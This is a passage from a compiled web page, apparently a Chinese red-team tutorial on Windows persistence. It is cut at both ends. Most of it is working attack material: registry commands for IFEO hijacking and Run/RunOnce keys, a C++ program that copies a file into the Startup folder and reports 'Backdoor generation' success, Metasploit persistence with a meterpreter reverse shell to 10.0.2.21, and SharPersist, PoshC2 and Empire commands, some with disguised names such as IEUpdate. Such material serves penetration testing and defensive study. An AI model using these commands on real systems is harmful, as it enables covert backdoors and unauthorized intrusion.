Options"}),"\uff0c\u76f4\u8bd1\u8fc7\u6765\u5c31\u662f\u6620\u50cf\u52ab\u6301\u3002\u5b83\u53c8\u88ab\u79f0\u4e3a\u201c\u91cd\u5b9a\u5411\u52ab\u6301\u201d\uff08Redirection Hijack\uff09\uff0c\u5b83\u548c\u201c\u6620\u50cf\u52ab\u6301\u201d\uff08Image Hijack\uff0c\u6216IFEO Hijack\uff09\u53ea\u662f\u79f0\u547c\u4e0d\u540c\uff0c\u5b9e\u9645\u4e0a\u90fd\u662f\u4e00\u6837\u7684\u6280\u672f\u624b\u6bb5\u3002\u767d\u8bdd\u6765\u8bb2\u5c31\u662f\u505a\u67d0\u4e2a\u64cd\u4f5c\u7684\u65f6\u5019\u88ab\u62e6\u622a\u4e0b\u6765\uff0c\u5e72\u4e86\u522b\u7684\u4e8b\u3002"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"\u5f53\u6211\u4eec\u53cc\u51fb\u8fd0\u884c\u7a0b\u5e8f\u65f6\uff0c\u7cfb\u7edf\u4f1a\u67e5\u8be2\u8be5IFEO\u6ce8\u518c\u8868\uff0c\u5982\u679c\u53d1\u73b0\u5b58\u5728\u548c\u8be5\u7a0b\u5e8f\u540d\u79f0\u5b8c\u5168\u76f8\u540c\u7684\u5b50\u952e\uff0c\u5c31\u67e5\u8be2\u5bf9\u5e94\u5b50\u5065\u4e2d\u5305\u542b\u7684\u201cdebugger\u201d\u952e\u503c\u540d\uff0c\u5982\u679c\u8be5\u53c2\u6570\u4e0d\u4e3a\u7a7a\uff0c\u7cfb\u7edf\u5219\u4f1a\u628a Debugger \u53c2\u6570\u91cc\u6307\u5b9a\u7684\u7a0b\u5e8f\u6587\u4ef6\u540d\u4f5c\u4e3a\u7528\u6237\u8bd5\u56fe\u542f\u52a8\u7684\u7a0b\u5e8f\u6267\u884c\u8bf7\u6c42\u6765\u5904\u7406\u3002\u8fd9\u6837\u6210\u529f\u6267\u884c\u7684\u662f\u906d\u5230\u201c\u52ab\u6301\u201d\u7684\u865a\u5047\u7a0b\u5e8f"})}),"\n",(0,r.jsx)(n.h4,{id:"\u53ef\u89c6\u5316\u4fee\u6539",children:"\u53ef\u89c6\u5316\u4fee\u6539"}),"\n",(0,r.jsxs)(n.p,{children:["\u5728iexplorer.exe\u4e2d\u52a0\u5165\u952e\u503c\u5bf9:",(0,r.jsx)(n.code,{children:"debugger c:\\windows\\system32\\cmd.exe"})]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"\u56fe\u7247",src:s(13611).A+"",width:"958",height:"946"})}),"\n",(0,r.jsx)(n.h4,{id:"\u547d\u4ee4\u884c\u4fee\u6539",children:"\u547d\u4ee4\u884c\u4fee\u6539"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\iexplore.exe" /v "Debugger" /t REG_SZ /d "c:\\windows\\system32\\cmd.exe" /f\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"\u56fe\u7247",src:s(60991).A+"",width:"1080",height:"443"})}),"\n",(0,r.jsx)(n.p,{children:"\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650"}),"\n",(0,r.jsx)(n.h2,{id:"\u5f00\u673a\u542f\u52a8\u9879",children:"\u5f00\u673a\u542f\u52a8\u9879"}),"\n",(0,r.jsx)(n.h3,{id:"\u5f00\u59cb\u83dc\u5355\u542f\u52a8\u9879",children:"\u5f00\u59cb\u83dc\u5355\u542f\u52a8\u9879"}),"\n",(0,r.jsx)(n.p,{children:"\u5f00\u59cb\u83dc\u5355\u542f\u52a8\u9879\uff0c\u6307\u793a\u542f\u52a8\u6587\u4ef6\u5939\u7684\u4f4d\u7f6e\uff0c\u5177\u4f53\u7684\u4f4d\u7f6e\u662f\u201c\u5f00\u59cb\u201d\u83dc\u5355\u4e2d\u7684\u201c\u6240\u6709\u7a0b\u5e8f\u201d-\u201c\u542f\u52a8\u201d\u9009\u9879\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:"[WIN+R \u8f93\u5165] shell:startup\n\nC:\\Users\\SD\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u76f8\u5173\u952e\u503c"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{children:"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders \nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"image-20210706153656188",src:s(99131).A+"",width:"2840",height:"1468"})}),"\n",(0,r.jsx)(n.p,{children:"\u7531\u4e8e\u6bcf\u53f0\u7535\u8111\u7684\u5feb\u901f\u542f\u52a8\u76ee\u5f55\u4e0d\u540c,\u53ef\u4ee5\u4ee3\u7801\u5b9e\u73b0"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-C++",children:'#include <iostream>\n#include <windows.h>\n\n\n#include   <shlobj.h>\n#pragma   comment(lib, "shell32.lib")\n\n\nBOOL AutoRun_Startup(CHAR* lpszSrcFilePath, CHAR* lpszDestFileName)\n{\nBOOL ret = false;\nCHAR szStartPath[MAX_PATH] = { 0 };\nCHAR szDestFilePath[MAX_PATH] = { 0 };\n//\u8fd4\u56de\u5feb\u901f\u542f\u52a8\u76ee\u5f55\u8def\u5f84\u5230szStartPath\nret = ::SHGetSpecialFolderPathA(NULL, szStartPath,CSIDL_STARTUP,TRUE);\n//\u5224\u65ad\u662f\u5426\u83b7\u53d6\u6210\u529f\nif (ret == TRUE)\n{\nprintf("[+]Get the quick start directory successfully\uff01\\n");\n}\nelse\n{\nprintf("[!]Get the quick start directory faild\uff01\\n");\nreturn FALSE;\n}\n//\u6784\u9020\u6587\u4ef6\u5728\u5feb\u901f\u542f\u52a8\u76ee\u5f55\u4e0b\u7684\u8def\u5f84\n::wsprintfA(szDestFilePath,"%s\\\\%s",szStartPath,lpszDestFileName);\n//\u590d\u5236\u6587\u4ef6\u5230\u5feb\u901f\u542f\u52a8\u76ee\u5f55\u4e0b\nret = ::CopyFileA(lpszSrcFilePath, szDestFilePath, FALSE);\nif (FALSE == ret)\n{\nprintf("[!]Failed to save the file in the quick start directory.\\n");\nreturn FALSE;\n}\nelse\n{\nprintf("[!]Successfully to save the file in the quick start directory.\\n");\n}\nprintf("[+]Backdoor generation in quick start directory successful!\\n");\nreturn TRUE;\n}\nint main(int argc, char* argv[])\n{\nprintf("[*]Useage:\\n    %s %s %s\\n", "Run_StartUp.exe", "E:\\\\010Editor\\\\010 Editor\\\\010Editor.exe", "010Editor.exe");\nif (argc == 3)\n{\nAutoRun_Startup(argv[1], argv[2]);\n}\nelse\n{\nprintf("[!]Please check the number of your parameters\\n");\n}\n}\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"\u56fe\u7247",src:s(24830).A+"",width:"1080",height:"136"})}),"\n",(0,r.jsx)(n.h3,{id:"\u7ec4\u7b56\u7565",children:"\u7ec4\u7b56\u7565"}),"\n",(0,r.jsxs)(n.p,{children:["\u7ec4\u7b56\u7565\uff0c\u8fd0\u884c",(0,r.jsx)(n.code,{children:"gpedit.msc"}),"\uff0c\u901a\u8fc7\u7ec4\u7b56\u7565\u7684\u201c\u811a\u672c(\u542f\u52a8/\u5173\u673a)\u201d\u9879\u6765\u8bf4\u5b9e\u73b0\u3002"]}),"\n",(0,r.jsx)(n.p,{children:"\u5177\u4f53\u4f4d\u7f6e\u5728\u201c\u8ba1\u7b97\u673a\u914d\u7f6e\u2192Windows\u8bbe\u7f6e\u201d\u9879\u4e0b\u3002\u56e0\u4e3a\u5176\u6781\u5177\u9690\u853d\u6027\uff0c\u56e0\u6b64\u5e38\u5e38\u88ab\u653b\u51fb\u8005\u5229\u7528\u6765\u505a\u670d\u52a1\u5668\u540e\u95e8\u3002"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:s(3280).A+"",width:"554",height:"389"})}),"\n",(0,r.jsx)(n.h3,{id:"\u542f\u52a8\u9879\u6ce8\u518c\u8868\u540e\u95e8",children:"\u542f\u52a8\u9879\u6ce8\u518c\u8868\u540e\u95e8"}),"\n",(0,r.jsx)(n.h4,{id:"\u547d\u4ee4\u884c",children:"\u547d\u4ee4\u884c"}),"\n",(0,r.jsx)(n.p,{children:"\u6ce8\u518c\u8868\u9879\u53ef\u4ee5\u4ece\u7ec8\u7aef\u6dfb\u52a0\u5230\u8fd0\u884c\u952e\u4ee5\u5b9e\u73b0\u6301\u4e45\u6027\u3002\u8fd9\u4e9b\u952e\u5c06\u5305\u542b\u5bf9\u7528\u6237\u767b\u5f55\u65f6\u5c06\u6267\u884c\u7684\u5b9e\u9645\u8d1f\u8f7d\u7684\u5f15\u7528\uff0c\u5df2\u77e5\u4f7f\u7528\u6b64\u6301\u4e45\u6027\u65b9\u6cd5\u7684\u5a01\u80c1\u56e0\u7d20\u548c\u7ea2\u961f\u4f7f\u7528\u4ee5\u4e0b\u6ce8\u518c\u8868\u4f4d\u7f6e\u3002"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:'reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Pentestlab /t REG_SZ /d "C:\\Users\\pentestlab\\pentestlab.exe"\nreg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" /v Pentestlab /t REG_SZ /d "C:\\Users\\pentestlab\\pentestlab.exe"\nreg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices" /v Pentestlab /t REG_SZ /d "C:\\Users\\pentestlab\\pentestlab.exe"\nreg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce" /v Pentestlab /t REG_SZ /d "C:\\Users\\pentestlab\\pentestlab.exe"\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:s(33171).A+"",width:"1024",height:"348"})}),"\n",(0,r.jsxs)(n.p,{children:["\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0c",(0,r.jsx)(n.code,{children:"HKEY_CURRENT_USER"}),"\u7684\u6539\u52a8\u4e0d\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650\uff0c\u800c\u66f4\u6539",(0,r.jsx)(n.code,{children:"HKEY_LOCAL_MACHINE"}),"\u5374\u662f\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"\u5982\u679c\u5df2\u83b7\u5f97\u63d0\u5347\u7684\u51ed\u636e\uff0c\u5219\u6700\u597d\u4f7f\u7528\u672c\u5730\u8ba1\u7b97\u673a\u6ce8\u518c\u8868\u4f4d\u7f6e\uff0c\u800c\u4e0d\u662f\u5f53\u524d\u7528\u6237\uff0c\u56e0\u4e3apayload\u5c06\u5728\u6bcf\u6b21\u7cfb\u7edf\u542f\u52a8\u65f6\u6267\u884c\uff0c\u800c\u4e0e\u4f7f\u7528\u7cfb\u7edf\u8eab\u4efd\u9a8c\u8bc1\u7684\u7528\u6237\u65e0\u5173\u3002"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:'reg add "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Pentestlab /t REG_SZ /d "C:\\tmp\\pentestlab.exe"\nreg add "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" /v Pentestlab /t REG_SZ /d "C:\\tmp\\pentestlab.exe"\nreg add "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices" /v Pentestlab /t REG_SZ /d "C:\\tmp\\pentestlab.exe"\nreg add "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce" /v Pentestlab /t REG_SZ /d "C:\\tmp\\pentestlab.exe"\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:s(75832).A+"",width:"1024",height:"414"})}),"\n",(0,r.jsx)(n.p,{children:"\u53e6\u5916\u4e24\u4e2a\u6ce8\u518c\u8868\u4f4d\u7f6e\uff0c\u8fd9\u4e9b\u4f4d\u7f6e\u53ef\u4ee5\u5141\u8bb8\u7ea2\u961f\u901a\u8fc7\u6267\u884c\u4efb\u610fpayload\u6216DLL\u6765\u5b9e\u73b0\u6301\u4e45\u6027\u3002\u8fd9\u4e9b\u5c06\u5728\u767b\u5f55\u671f\u95f4\u6267\u884c\uff0c\u5e76\u4e14\u9700\u8981\u7ba1\u7406\u5458\u7ea7\u522b\u7684\u7279\u6743\u3002"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001" /v Pentestlab /t REG_SZ /d "C:\\tmp\\pentestlab.exe"\nreg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend" /v Pentestlab /t REG_SZ /d "C:\\tmp\\pentestlab.dll"\n'})}),"\n",(0,r.jsx)(n.h4,{id:"metasploit",children:"Metasploit"}),"\n",(0,r.jsx)(n.p,{children:"Metasploit Framework\u901a\u8fc7\u4f7f\u7528Meterpreter\u811a\u672c\u548c\u540e\u671f\u5229\u7528\u6a21\u5757\u6765\u652f\u6301\u901a\u8fc7\u6ce8\u518c\u8868\u7684\u6301\u4e45\u6027\u3002Meterpreter\u811a\u672c\u5c06\u4ee5VBS\u811a\u672c\u7684\u5f62\u5f0f\u521b\u5efa\u4e00\u4e2apayload\uff0c\u8be5\u8d1f\u8f7d\u5c06\u88ab\u62d6\u653e\u5230\u78c1\u76d8\u4e0a\uff0c\u5e76\u5c06\u521b\u5efa\u4e00\u4e2a\u6ce8\u518c\u8868\u9879\uff0c\u8be5\u6ce8\u518c\u8868\u9879\u5c06\u5728\u7528\u6237\u767b\u5f55\u671f\u95f4\u8fd0\u884c\u8be5payload\u3002"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"run persistence -U -P windows/x64/meterpreter/reverse_tcp -i 5 -p 443 -r 10.0.2.21\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:s(83369).A+"",width:"1024",height:"257"})}),"\n",(0,r.jsx)(n.p,{children:"\u53e6\u5916\uff0c\u8fd8\u6709\u4e00\u4e2a\u540e\u671f\u5f00\u53d1\u6a21\u5757\uff0c\u53ef\u7528\u4e8e\u6301\u4e45\u6027\u3002\u8be5\u6a21\u5757\u9700\u8981\u4ee5\u4e0b\u914d\u7f6e\uff0c\u5e76\u5c06\u53ef\u6267\u884c\u6587\u4ef6\u653e\u7f6e\u5728\u53d7\u611f\u67d3\u7cfb\u7edf\u4e0a\u7684\u53ef\u5199\u4f4d\u7f6e\u3002"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"use post/windows/manage/persistence_exe\nset REXEPATH /tmp/pentestlab.exe\nset SESSION 2\nset STARTUP USER\nset LOCALEXEPATH C:\\\\tmp\nrun\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:s(94083).A+"",width:"770",height:"186"})}),"\n",(0,r.jsxs)(n.p,{children:["\u7531\u4e8e\u5df2\u9009\u62e9",(0,r.jsx)(n.strong,{children:"USER"}),"\u4f5c\u4e3a\u9009\u9879\uff0c\u8be5\u6a21\u5757\u5c06\u4f7f\u7528\u5f53\u524d\u7528\u6237\u7684\u6ce8\u518c\u8868\u4f4d\u7f6e\u3002"]}),"\n",(0,r.jsxs)(n.p,{children:["\u5982\u679c\u5df2\u83b7\u5f97\u7cfb\u7edf\u7ea7\u522b\u7684\u7279\u6743\uff0c\u5219\u53ef\u4ee5\u5c06\u8be5\u6a21\u5757\u914d\u7f6e\u4e3a\u5728",(0,r.jsx)(n.strong,{children:"HKLM"}),"\u4f4d\u7f6e\u4e2d\u521b\u5efa\u6ce8\u518c\u8868\u9879\u3002\u8be5",(0,r.jsx)(n.strong,{children:"STARTUP"}),"\u9009\u9879\u5c06\u9700\u8981\u6539\u53d8\u7cfb\u7edf\u3002"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"set STARTUP SYSTEM\n"})}),"\n",(0,r.jsx)(n.h4,{id:"sharpersist",children:"SharPersist"}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.a,{href:"https://github.com/fireeye/SharPersist",children:"SharPersist"}),"\u662f",(0,r.jsx)(n.a,{href:"https://twitter.com/h4wkst3r",children:"Brett Hawkins"}),"\u5728C\uff03\u4e2d\u5f00\u53d1\u7684\u5de5\u5177\uff0c\u5b83\u7ed3\u5408\u4e86\u591a\u79cd\u6301\u4e45\u6027\u6280\u672f\uff0c\u5305\u62ec\u6dfb\u52a0\u6ce8\u518c\u8868\u8fd0\u884c\u952e\u3002\u8be5\u5de5\u5177\u5305\u53ef\u4ee5\u52a0\u8f7d\u5230\u652f\u6301\u53cd\u5c04\u52a0\u8f7d\u7684\u5404\u79cd\u547d\u4ee4\u548c\u63a7\u5236\u6846\u67b6\u4e2d\uff0c\u4f8b\u5982Cobalt Strike\u548cPoshC2\u3002\u4ee5\u4e0b\u547d\u4ee4\u5c06\u521b\u5efa\u4e00\u4e2a\u6ce8\u518c\u8868\u9879\uff0c\u8be5\u6ce8\u518c\u8868\u9879\u5c06\u4ece\u4e0eMetasploit Framework\u6a21\u5757\u76f8\u540c\u7684\u6ce8\u518c\u8868\u4f4d\u7f6e\u6267\u884c\u4efb\u610fpayload\u3002"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:'SharPersist -t reg -c "C:\\Windows\\System32\\cmd.exe" -a "/c C:\\tmp\\pentestlab.exe" -k "hkcurun" -v "pentestlab" -m add\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:" SharPersist \u2013\u4ee5\u7528\u6237\u8eab\u4efd\u6ce8\u518c",src:s(52954).A+"",width:"1024",height:"216"})}),"\n",(0,r.jsx)(n.p,{children:"\u5982\u679c\u5df2\u83b7\u5f97\u63d0\u5347\u7684\u8bbf\u95ee\u6743\u9650\uff0c\u8bf7\u4fee\u6539\u547d\u4ee4\u4ee5\u5728\u672c\u5730\u8ba1\u7b97\u673a\u4f4d\u7f6e\u4e2d\u5b89\u88c5\u6ce8\u518c\u8868\u9879\uff0c\u4ee5\u5b9e\u73b0\u6240\u6709\u7528\u6237\u7684\u6301\u4e45\u6027\u3002"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:'SharPersist -t reg -c "C:\\Windows\\System32\\cmd.exe" -a "/c C:\\tmp\\pentestlab.exe" -k "hklmrun" -v "pentestlab" -m add -o env\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"SharPersist \u2013\u6ce8\u518c\u4e3aSYSTEM",src:s(72011).A+"",width:"1024",height:"244"})}),"\n",(0,r.jsxs)(n.p,{children:["SharPersist\u8fd8\u901a\u8fc7",(0,r.jsx)(n.strong,{children:"RunOnce"}),"\u548c",(0,r.jsx)(n.strong,{children:"RunOnceEx"}),"\u6ce8\u518c\u8868\u9879\u5305\u542b\u6301\u4e45\u6027\u529f\u80fd\u3002\u4ee5\u4e0b\u547d\u4ee4\u5c06\u5728\u8fd9\u4e9b\u4f4d\u7f6e\u521b\u5efa\u6ce8\u518c\u8868\u9879\uff0c\u8fd9\u4e9b\u6ce8\u518c\u8868\u9879\u5c06\u6267\u884c\u4efb\u610fpayload\u3002"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:'SharPersist -t reg -c "C:\\Windows\\System32\\cmd.exe" -a "/c pentestlab.exe" -k "hklmrunonce" -v "Pentestlab" -m add\nSharPersist -t reg -c "C:\\Windows\\System32\\cmd.exe" -a "/c pentestlab.exe" -k "hklmrunonceex" -v "Pentestlab" -m add\nSharPersist -t reg -c "C:\\Windows\\System32\\cmd.exe" -a "/c pentestlab.exe" -k "hkcurunonce" -v "Pentestlab" -m add\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:" SharPersist \u2013 RunOnce\u6ce8\u518c\u8868\u9879",src:s(56197).A+"",width:"1024",height:"506"})}),"\n",(0,r.jsxs)(n.p,{children:["SharPersist\u8fd8\u63d0\u4f9b\u4e86\u4f7f\u7528\u53e6\u4e00\u4e2a\u6ce8\u518c\u8868\u4f4d\u7f6e\u8fdb\u884c\u6301\u4e45\u5316\u7684\u9009\u9879\uff08",(0,r.jsx)(n.strong,{children:"UserInitMprLogonScript"}),"\uff09\u3002"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:'SharPersist -t reg -c "C:\\Windows\\System32\\cmd.exe" -a "/c pentestlab.exe" -k "logonscript" -m add\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"SharPersist \u2013\u767b\u5f55\u811a\u672c",src:s(37896).A+"",width:"1024",height:"301"})}),"\n",(0,r.jsx)(n.h4,{id:"poshc2",children:"PoshC2"}),"\n",(0,r.jsx)(n.p,{children:"PoshC2\u652f\u6301\u5404\u79cd\u6301\u4e45\u6027\u529f\u80fd\uff0c\u5305\u62ec\u6ce8\u518c\u8868\u8fd0\u884c\u952e\u7684\u65b9\u6cd5\u3002\u4ee5\u4e0b\u547d\u4ee4\u5c06\u5728\u76ee\u6807\u4e3b\u673a\u4e2d\u521b\u5efa\u4e24\u4e2a\u6ce8\u518c\u8868\u9879\u3002"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:"install-persistence\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:" PoshC2 \u2013\u6301\u4e45\u6027",src:s(49621).A+"",width:"688",height:"202"})}),"\n",(0,r.jsx)(n.p,{children:"\u6ce8\u518c\u8868\u7684\u201c\u8fd0\u884c\u201d\u9879\u5c06\u5177\u6709IEUpdate\u7684\u540d\u79f0\uff0c\u4ee5\u4fbf\u770b\u8d77\u6765\u5408\u6cd5\uff0c\u7b2c\u4e8c\u4e2a\u6ce8\u518c\u8868\u9879\u5c06\u4f5c\u4e3a\u5899\u7eb8\u9690\u85cf\u5728\u6ce8\u518c\u8868\u4e2d\u3002"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:" PoshC2 \u2013\u6ce8\u518c\u8868\u8fd0\u884c\u952e",src:s(85913).A+"",width:"822",height:"210"})}),"\n",(0,r.jsx)(n.h4,{id:"empire",children:"Empire"}),"\n",(0,r.jsx)(n.p,{children:"\u5982\u679c\u5c06Empire\u7528\u4f5c\u547d\u4ee4\u548c\u63a7\u4ef6\uff0cEmpire\u5305\u542b\u4e24\u4e2a\u4e0e\u901a\u8fc7\u6ce8\u518c\u8868\u8fd0\u884c\u9879\u4e0e\u6301\u4e45\u6027\u6280\u672f\u5bf9\u9f50\u7684\u6a21\u5757\u3002\u6839\u636e\u7279\u6743\u7ea7\u522b\uff0c\u8fd9\u4e9b\u6a21\u5757\u5c06\u5c1d\u8bd5\u5728\u4ee5\u4e0b\u6ce8\u518c\u8868\u4f4d\u7f6e\u4e2d\u5b89\u88c5base64payload\uff1a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:"HKCU:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Debug\nHKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Debug\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:" Empire \u2013 Debug \u6ce8\u518c\u8868\u9879payload",src:s(24178).A+"",width:"1024",height:"339"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:"usemodule persistence/userland/registry\nusemodule persistence/elevated/registry*\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:" Empire \u2013Persistence Registry Module",src:s(34480).A+"",width:"1024",height:"182"})}),"\n",(0,r.jsxs)(n.p,{children:["\u5c06\u5728\u540d\u79f0",(0,r.jsx)(n.strong,{children:"Updater"}),"\u4e0b\u521b\u5efa\u53e6\u4e00\u4e2a\u6ce8\u518c\u8868\u9879\uff0c\u8be5\u6ce8\u518c\u8868\u9879\u5c06\u5305\u542b\u8981\u6267\u884c\u7684\u547d\u4ee4\u3002PowerShell\u5c06\u5c1d\u8bd5\u5728\u4e0b\u6b21\u767b\u5f55\u65f6\u8fd0\u884c",(0,r.jsx)(n.strong,{children:"Debug"}),"\u5bc6\u94a5\u4e2d\u5b58\u50a8\u7684payload\uff0c\u4ee5\u5b9e\u73b0\u6301\u4e45\u6027\u3002"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:"HKCU:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nHKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:" Empire \u2013 Registry Run Key",src:s(23050).A+"",width:"1024",height:"473"})}),"\n",(0,r.jsx)(n.h2,{id:"\u8ba1\u5212\u4efb\u52a1",children:"\u8ba1\u5212\u4efb\u52a1"}),"\n",(0,r.jsxs)(n.p,{children:["Windows\u64cd\u4f5c\u7cfb\u7edf\u63d0\u4f9b\u4e86\u4e00\u4e2a\u5b9e\u7528\u7a0b\u5e8f\uff08schtasks.exe\uff09\uff0c\u4f7f\u7cfb\u7edf\u7ba1\u7406\u5458\u80fd\u591f\u5728\u7279\u5b9a\u7684\u65e5\u671f\u548c\u65f6\u95f4\u6267\u884c\u7a0b\u5e8f\u6216\u811a\u672c\u3002\u8fd9\u79cd\u884c\u4e3a\u53ef\u4f5c\u4e3a\u4e00\u79cd\u6301\u4e45\u6027\u673a\u5236\u88abred team\u5229\u7528\u3002\u901a\u8fc7\u8ba1\u5212\u4efb\u52a1\u6267\u884c\u6301\u4e45\u6027\u4e0d\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650\uff0c\u4f46\u5982\u679c\u5df2\u83b7\u5f97\u63d0\u5347\u7684\u6743\u9650\uff0c\u5219\u5141\u8bb8\u8fdb\u4e00\u6b65\u64cd\u4f5c\uff0c\u4f8b\u5982\u5728\u7528\u6237\u767b\u5f55\u671f\u95f4\u6216\u5728\u7a7a\u95f2\u72b6\u6001\u671f\u95f4\u6267\u884c\u4efb\u52a1\u3002\n\u8ba1\u5212\u4efb\u52a1\u7684\u6301\u4e45\u5316\u6280\u672f\u53ef\u4ee5\u624b\u52a8\u5b9e\u73b0\uff0c\u4e5f\u53ef\u4ee5\u81ea\u52a8\u5b9e\u73b0\u3002payload\u53ef\u4ee5\u4ece\u78c1\u76d8\u6216\u8fdc\u7a0b\u4f4d\u7f6e\u6267\u884c\uff0c\u5b83\u4eec\u53ef\u4ee5\u662f\u53ef\u6267\u884c\u6587\u4ef6\u3001powershell\u811a\u672c\u6216scriptlet\u7684\u5f62\u5f0f\u3002",(0,r.jsx)(n.strong,{children:"\u8fd9\u88ab\u8ba4\u4e3a\u662f\u4e00\u79cd\u65e7\u7684\u6301\u4e45\u6027\u6280\u672f\uff0c\u4f46\u662f\u5b83\u4ecd\u7136\u53ef\u4ee5\u5728red team\u573a\u666f\u4e2d\u4f7f\u7528\uff0c\u5e76\u4e14\u7531\u5404\u79cd\u5f00\u6e90\u5de5\u5177\u652f\u6301"}),"\u3002"]}),"\n",(0,r.jsxs)(n.blockquote,{children:["\n",(0,r.jsx)(n.p,{children:"\u56fe\u5f62\u5316\u4f4d\u7f6e\uff1a\u5f00\u59cb--\u6240\u6709\u7a0b\u5e8f--\u9644\u4ef6--\u7cfb\u7edf\u5de5\u5177--\u4efb\u52a1\u8ba1\u5212\u7a0b\u5e8f"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:"Windows\u547d\u4ee4\u884c\u5b9e\u73b0\u5b9a\u65f6\u4efb\u52a1\u4e3b\u8981\u6709schtasks\u4e0eat\u4e8c\u79cd\u65b9\u5f0f:"}),"\n",(0,r.jsx)(n.p,{children:"at \u9002\u7528\u4e8ewindows xp/2003\uff0cschtasks\u9002\u7528\u4e8ewin7/2008\u6216\u8005\u4ee5\u540e"}),"\n",(0,r.jsx)(n.p,{children:"\u6bcf\u4e94\u5206\u949f\u6267\u884c\u4e00\u6b21"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:'schtasks /create /sc minute /mo 5 /tn "sd" /tr 